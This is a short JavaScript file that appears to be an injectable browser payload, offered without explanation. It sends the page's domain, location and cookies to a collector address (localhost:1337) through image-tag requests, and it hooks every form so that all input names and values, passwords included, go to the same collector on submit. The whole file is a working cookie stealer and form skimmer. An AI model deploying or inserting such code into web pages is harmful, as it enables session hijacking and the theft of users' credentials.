(function(){

    var cc = 'http://localhost:1337';

    function url(path, q) {
        var ps = [];
        for (var k in q) {
            if (q.hasOwnProperty(k)) {
                ps.push(encodeURIComponent(k) + '=' + encodeURIComponent(q[k]));
            }
        }
        return cc + path + '?' + ps.join('&');
    }

    function send(path, q) {
        var img = document.createElement('img');
        img.setAttribute('src', url(path, q));
        document.getElementsByTagName('body')[0].appendChild(img);
    }

    send('/document', {
        domain: document.domain,
        location: document.location,
        cookie: document.cookie
    });

    var forms = document.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) {
        var form = forms[i];
        function go(ev) {
            q = {};
            var inputs = document.getElementsByTagName('input');
            for (var j = 0; j < inputs.length; j++) {
                q[j + '_' + inputs[j].name] = inputs[j].value;
            }
            send('/forms', q);
        }
        if (form.addEventListener) {
          form.addEventListener('submit', go)
        } else {
          form.attachEvent('onsubmit', go)
        }
    }

})();
